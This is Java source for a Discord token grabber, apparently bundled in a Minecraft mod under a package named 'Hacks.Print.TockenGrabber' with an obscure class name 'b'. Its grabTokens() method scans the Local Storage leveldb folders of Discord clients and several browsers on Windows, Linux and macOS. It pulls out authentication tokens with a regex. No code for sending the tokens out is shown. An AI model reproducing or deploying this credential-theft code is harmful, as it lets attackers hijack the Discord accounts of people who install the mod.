package com.example.examplemod.Hacks.Print.TockenGrabber;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class b {
   public static List grabTokens() {
      List tokens = new ArrayList();
      String fs = System.getenv("file.separator");
      String localappdata = System.getenv("LOCALAPPDATA");
      String roaming = System.getenv("APPDATA");
      String[][] paths = new String[][]{{"Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb"}, {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"}};
      String[][] var5 = paths;
      int var6 = paths.length;

      for(int var7 = 0; var7 < var6; ++var7) {
         String[] path = var5[var7];

         try {
            File file = new File(path[1]);
            String[] var10 = file.list();
            int var11 = var10.length;

            for(int var12 = 0; var12 < var11; ++var12) {
               String pathname = var10[var12];
               if (!pathname.equals("LOCK")) {
                  FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                  DataInputStream in = new DataInputStream(fstream);
                  BufferedReader br = new BufferedReader(new InputStreamReader(in));

                  String strLine;
                  while((strLine = br.readLine()) != null) {
                     Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}|mfa\\.[\\w]{84}");
                     Matcher m = p.matcher(strLine);

                     while(m.find()) {
                        if (!tokens.contains(m.group())) {
                           tokens.add(m.group());
                        }
                     }
                  }
               }
            }
         } catch (Exception var20) {
         }
      }

      return tokens;
   }
}
